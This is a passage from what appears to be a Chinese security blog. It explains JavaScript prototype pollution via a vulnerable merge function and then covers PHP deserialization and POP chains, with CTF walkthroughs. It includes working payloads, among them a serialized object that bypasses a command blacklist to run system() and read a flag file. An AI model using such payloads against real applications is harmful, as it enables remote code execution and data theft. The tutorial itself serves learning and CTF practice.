<span class="number">2</span>&#125;&#125;;</span><br><span class="line"><span class="title function_">merge</span>(o1, o2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">b</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h4 id="关键点："><a href="#关键点：" class="headerlink" title="关键点："></a>关键点：</h4><ul><li><strong><code>for...in</code> 不会直接枚举 <code>__proto__</code> 作为普通键。</strong></li><li><code>o2</code> 只有一个直接属性 <code>a</code>，因此 <code>merge</code> 函数中只会处理 <code>a</code>。</li><li><code>__proto__</code> 被用作原型设置，<code>&#123;b: 2&#125;</code> 成为了 <code>o2</code> 的原型。</li></ul><p>因此：</p><ul><li><strong><code>o1</code> 合并结果</strong>：<code>o1.a = 1</code>。</li><li><strong><code>o1.b</code> 是 undefined</strong>：因为 <code>b</code> 是 <code>o2</code> 的原型属性，而 <code>merge</code> 函数不会递归或复制原型链的属性。</li></ul><h4 id="4-为什么-o1-b-2-这句话不成立？"><a href="#4-为什么-o1-b-2-这句话不成立？" class="headerlink" title="4. 为什么 o1.b = 2 这句话不成立？"></a>4. <strong>为什么 <code>o1.b = 2</code> 这句话不成立？</strong></h4><p>合并后，<code>o1</code> 并没有 <code>b</code>，因为：</p><ul><li><code>b</code> 并不是 <code>o2</code> 自身的属性，而是其原型的属性。</li><li><code>merge</code> 函数只处理直接属性，未复制 <code>b</code> 到 <code>o1</code>。</li></ul><p><strong>总结：</strong> <code>__proto__</code> 在对象字面量中会被解释为设置原型，而不是普通键值对。所以，<code>merge</code> 只会处理 <code>o2</code> 的直接属性（<code>a</code>），不会处理通过原型链继承的 <code>b</code>，因此 <code>o1.b</code> 仍然是 <code>undefined</code>。</p><h4 id="5-为什么运行结果确是2"><a href="#5-为什么运行结果确是2" class="headerlink" title="5.为什么运行结果确是2"></a>5.为什么运行结果确是2</h4><p>运行结果来看，<code>console.log(o1.b)</code> 返回了 <code>2</code>，这表明在某种程度上确实读取到了属性 <code>b</code>，而这是从 <code>__proto__</code> 原型链继承的属性。我们重新分析以下几个关键点，帮助理解为什么会发生这种现象：</p><h4 id="5-1-proto-在对象字面量中的作用"><a href="#5-1-proto-在对象字面量中的作用" class="headerlink" title="5.1. __proto__ 在对象字面量中的作用"></a>5.1. <strong><code>__proto__</code> 在对象字面量中的作用</strong></h4><p>当你定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123; <span class="attr">b</span>: <span class="number">2</span> &#125; &#125;;</span><br></pre></td></tr></table></figure><p><code>o2</code> 的结构变成：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">o2 = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">__proto__</span>: &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这意味着 <code>o2</code> 的原型被设置为 <code>&#123; b: 2 &#125;</code>，即 <code>o2</code> 通过原型链可以访问 <code>b</code>。</p><h4 id="5-2-merge-函数如何工作"><a href="#5-2-merge-函数如何工作" class="headerlink" title="5.2. merge 函数如何工作"></a>5.2. <strong><code>merge</code> 函数如何工作</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>for...in</code> 的行为</strong>： <code>for...in</code> 会迭代 <code>source</code> 的<strong>可枚举属性</strong>，包括继承自原型的属性。</li></ul><p>在这个情况下：</p><ul><li><code>o2</code> 的直接属性是 <code>a</code>。</li><li><code>o2</code> 通过原型链继承了属性 <code>b</code>，且 <code>b</code> 是可枚举的。</li></ul><h4 id="5-3-执行过程"><a href="#5-3-执行过程" class="headerlink" title="5.3. 执行过程"></a>5.3. <strong>执行过程</strong></h4><p>当 <code>merge(o1, o2)</code> 执行时：</p><ul><li><code>key = &quot;a&quot;</code>：将 <code>o2.a</code> 的值 <code>1</code> 合并到 <code>o1</code>。</li><li><code>key = &quot;b&quot;</code>：由于 <code>b</code> 是从 <code>__proto__</code> 继承的，它也被 <code>for...in</code> 迭代到，因此 <code>o2.b</code> 的值 <code>2</code> 被赋值到 <code>o1.b</code>。</li></ul><p>最终，<code>o1</code> 的内容是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">o1 = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="5-4-为什么-console-log-o1-b-输出-2？"><a href="#5-4-为什么-console-log-o1-b-输出-2？" class="headerlink" title="5.4. 为什么 console.log(o1.b) 输出 2？"></a>5.4. <strong>为什么 <code>console.log(o1.b)</code> 输出 <code>2</code>？</strong></h4><p>当 <code>merge</code> 函数运行完后，<code>o1</code> 对象被赋予了一个新属性 <code>b</code>，其值为 <code>2</code>。因此，当你执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">b</span>); <span class="comment">// 输出 2</span></span><br></pre></td></tr></table></figure><p>这正是由于 <code>b</code> 被直接合并到 <code>o1</code> 的原因。</p><h4 id="6-这是否算原型污染？"><a href="#6-这是否算原型污染？" class="headerlink" title="6. 这是否算原型污染？"></a>6. <strong>这是否算原型污染？</strong></h4><p><strong>不算真正的原型污染</strong>，原因如下：</p><ul><li><strong>污染的定义</strong>：原型污染意味着修改了原型对象（如 <code>Object.prototype</code>），导致所有对象都受到影响。</li><li>你的操作仅仅是在 <code>o1</code> 上设置了一个普通属性 <code>b</code>，并没有修改全局原型链。因此，其他对象（如 <code>&#123;&#125;</code>）并不会受到影响。</li></ul><h4 id="7-验证是否污染了全局原型"><a href="#7-验证是否污染了全局原型" class="headerlink" title="7. 验证是否污染了全局原型"></a>7. <strong>验证是否污染了全局原型</strong></h4><p>你可以验证：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">b</span>); <span class="comment">// 如果是原型污染，会输出 2，但是输出的是undefined</span></span><br></pre></td></tr></table></figure><p>若结果为 <code>undefined</code>，说明没有污染全局原型。</p><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>你当前的 <code>merge</code> 操作仅仅是将 <code>b</code> 合并到了 <code>o1</code> 对象上，没有导致原型污染。 <strong>要实现原型污染，需要明确操作全局原型链（例如通过修改 <code>Object.prototype</code>）</strong>。</p><h4 id="好，那么我们言归正传，如何才能真正污染呢？"><a href="#好，那么我们言归正传，如何才能真正污染呢？" class="headerlink" title="好，那么我们言归正传，如何才能真正污染呢？"></a>好，那么我们言归正传，如何才能真正污染呢？</h4><p>主角登场–请看下面代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">//注意let o2 = &#123;&quot;a&quot;: 1, &quot;proto&quot;: &#123;&quot;b&quot;: 2&#125;&#125;这种写法和let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;写法结果是一样的</span></span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">[<span class="title class_">Running</span>] node <span class="string">&quot;d:\web\污染\PCB-notadmin\payload.js&quot;</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line">[<span class="title class_">Done</span>] exited <span class="keyword">with</span> code=<span class="number">0</span> <span class="keyword">in</span> <span class="number">2.918</span> seconds</span><br></pre></td></tr></table></figure><h4 id="1-JSON-parse-和-proto-的作用"><a href="#1-JSON-parse-和-proto-的作用" class="headerlink" title="1. JSON.parse 和 __proto__ 的作用"></a>1. <strong><code>JSON.parse</code> 和 <code>__proto__</code> 的作用</strong></h4><p>在 <code>JSON.parse</code> 中，<code>&#123;&quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;</code> 会被解析为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">__proto__</span>: &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，<code>o2</code> 的 <code>__proto__</code> 实际上是一个普通属性，而不是原型链。</p><p>但是，当 <code>merge</code> 函数执行以下语句时：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target[key] = source[key];</span><br></pre></td></tr></table></figure><p>那么如果 <code>key</code> 是 <code>__proto__</code>，它会触发 <strong>原型链修改</strong>，这样就相当于给最顶层的Object.prototype所指向的对象添加了属性，所以我们随便创建一个对象也就有了b这个属性 。</p><h4 id="2-原型污染的发生"><a href="#2-原型污染的发生" class="headerlink" title="2. 原型污染的发生"></a>2. <strong>原型污染的发生</strong></h4><p>在 <code>merge(o1, o2)</code> 中：</p><ul><li><code>key = &quot;a&quot;</code>：<code>o1.a = 1</code>，无问题。</li><li><code>key = &quot;__proto__&quot;</code>：<code>o1[&quot;__proto__&quot;] = &#123; b: 2 &#125;</code>。</li></ul><p>当设置 <code>o1[&quot;__proto__&quot;] = &#123; b: 2 &#125;</code> 时，实际上修改了 <code>o1</code> 的原型链，使 <code>o1</code> 和所有继承自 <code>Object.prototype</code> 的对象（包括 <code>o3</code>）的原型被污染。</p><p>因此：</p><ul><li><code>o1.b</code> 等于 <code>2</code>，因为 <code>b</code> 来自于被污染的原型。</li><li><code>o3.b</code> 也等于 <code>2</code>，即使 <code>o3</code> 本身没有 <code>b</code>，它仍然从全局的 <code>Object.prototype</code> 继承了污染。</li></ul><h4 id="3-验证污染"><a href="#3-验证污染" class="headerlink" title="3. 验证污染"></a>3. <strong>验证污染</strong></h4><p>可以通过以下方式验证污染：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">b</span>); <span class="comment">// 输出 2，说明 Object.prototype 被污染</span></span><br></pre></td></tr></table></figure><p>这就是JS原型链污染基础了。</p><p><a href="https://blog.csdn.net/qq_51586883/article/details/119867720">js原型链污染(超详细)</a></p><p><a href="https://carsaid.github.io/burpsuite-learn/wsa/advanced/prototype-pollution/server-side/">服务端原型链污染漏洞</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -NodeJs -pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化&amp;SESSION反序列化</title>
      <link href="/2024/07/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/07/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化-SESSION反序列化"><a href="#PHP反序列化-SESSION反序列化" class="headerlink" title="PHP反序列化&amp;SESSION反序列化"></a>PHP反序列化&amp;SESSION反序列化</h1><h2 id="PHP反序列化基本概念"><a href="#PHP反序列化基本概念" class="headerlink" title="PHP反序列化基本概念"></a>PHP反序列化基本概念</h2><p>php序列化就是将一个对象，进行变换成一个字符串，这个字符串就是一个个键值对，方便传输数据，那反序列化，就是把它翻过来，从一个个键值对再转换成一个对象。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;ooo&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">输出：  </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ooo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">18</span>;&#125;</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>;：表示这是一个对象（Object），类名是test，类名长度为<span class="number">4</span>，包含<span class="number">2</span>个属性。</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ooo&quot;</span>;：第一个属性是字符串类型（String），属性名为name，长度为<span class="number">4</span>，对应的值为字符串ooo，长度为<span class="number">3</span>。</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">18</span>;：第二个属性也是字符串类型（String），属性名为age，长度为<span class="number">3</span>，对应的值为整数（Integer）<span class="number">18</span>。</span><br><span class="line">综上所述，这段代码表示一个类名为test的对象，它有两个属性：name（值为<span class="string">&quot;ooo&quot;</span>）和age（值为<span class="number">18</span>）。</span><br></pre></td></tr></table></figure><h2 id="PHP反序列化的几个必知魔术方法"><a href="#PHP反序列化的几个必知魔术方法" class="headerlink" title="PHP反序列化的几个必知魔术方法"></a><a href="https://zhuanlan.zhihu.com/p/377676274">PHP反序列化的几个必知魔术方法</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()，类的构造函数,在创造一个对象时候，首先会去执行的一个方法。但是在序列化和反序列化过程是不会触发的。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()，类的析构函数,在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>()，在对象中调用一个不可访问方法时,<span class="title function_ invoke__">__call</span>() 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>()，在静态上下文中调用一个不可访问方法时，<span class="title function_ invoke__">__callStatic</span>() 会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>()，读取不可访问属性的值时，<span class="title function_ invoke__">__get</span>() 会被调用。__get魔术方法需要一个参数，这个参数代表着访问不存在的属性值。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>()，给不可访问属性赋值时，<span class="title function_ invoke__">__set</span>() 会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>()，当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用,该魔术方法使用了<span class="keyword">isset</span>()或者<span class="keyword">empty</span>()只要属性是<span class="keyword">private</span>或者不存在的都会触发。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。如果一个类定义了魔术方法 <span class="title function_ invoke__">__unset</span>() ，那么我们就可以使用 <span class="keyword">unset</span>() 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()，执行<span class="title function_ invoke__">serialize</span>()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()，执行<span class="title function_ invoke__">unserialize</span>()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()，类被当成字符串时的回应方法</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set_state</span>()，调用<span class="title function_ invoke__">var_export</span>()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()，当使用 <span class="keyword">clone</span> 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 <span class="title function_ invoke__">__clone</span>() ，如果该魔术方法存在的话。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()，打印所需调试信息</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="小试牛刀—–-NewStarCTF-2023-公开赛道-Unserialize？"><a href="#小试牛刀—–-NewStarCTF-2023-公开赛道-Unserialize？" class="headerlink" title="小试牛刀—–[NewStarCTF 2023 公开赛道]Unserialize？"></a>小试牛刀—–[NewStarCTF 2023 公开赛道]Unserialize？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">POST:unser=O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;s:<span class="number">35</span>:<span class="string">&quot;sort /th1s_1s_fffflllll4444aaaggggg&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="PHP的POP链"><a href="#PHP的POP链" class="headerlink" title="PHP的POP链"></a>PHP的POP链</h2><p>按我自己的理解，PHP的pop链就是通过改变对象的属性，改变对象的元素的属性，去触发相应的魔术方法，来进行一个链式反应，以此来达到我们的目的。</p><h3 id="示例-触发tostring方法，进行链式反应"><a href="#示例-触发tostring方法，进行链式反应" class="headerlink" title="示例(触发tostring方法，进行链式反应)"></a>示例(触发tostring方法，进行链式反应)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$o</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;111&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;this_is_flag&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$b1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a1</span>-&gt;x=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.exe -c D:\phpstudy_pro\Extensions\php\php7.<span class="number">3.4</span>nts\php.ini D:\PhpstormProjects\untitled1\payload.php</span><br><span class="line"></span><br><span class="line"><span class="number">111</span>flag&#123;this_is_flag&#125;</span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line"><span class="comment">//这就是一个简单的链式反应</span></span><br></pre></td></tr></table></figure><h3 id="小试牛刀—–-MRCTF2020-Ezpop"><a href="#小试牛刀—–-MRCTF2020-Ezpop" class="headerlink" title="小试牛刀—–[MRCTF2020]Ezpop"></a>小试牛刀—–[MRCTF2020]Ezpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 